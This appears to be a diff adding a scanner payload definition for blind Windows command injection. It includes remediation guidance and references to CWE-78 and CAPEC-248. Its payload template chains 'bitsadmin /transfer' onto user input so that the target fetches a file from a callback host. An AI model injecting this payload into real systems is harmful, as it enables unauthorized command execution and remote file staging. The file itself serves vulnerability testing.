@@ -1,0 +1,20 @@
+{
+  "id": "m3-blind-cmdi-windows-bitsadmin",
+  "bug_class": "command_injection",
+  "title": "Blind OS command injection (Windows bitsadmin /transfer, OS-gated)",
+  "severity": "Critical",
+  "applies_when": {
+    "category": "windows"
+  },
+  "insertion_kinds": [],
+  "oracle": {
+    "kind": "oob",
+    "payload_template": "&bitsadmin /transfer x http://{callback} %TEMP%\\x"
+  },
+  "references": [
+    "CWE-78",
+    "CAPEC-248"
+  ],
+  "remediation": "Never pass user input to a shell. Invoke programs with an argument vector (no shell interpolation), drop shell metacharacters and newlines, and validate against a strict allowlist. A blind command that reaches the unique callback proves out-of-band shell execution.",
+  "payload_family": "shell-windows-bitsadmin"
+}
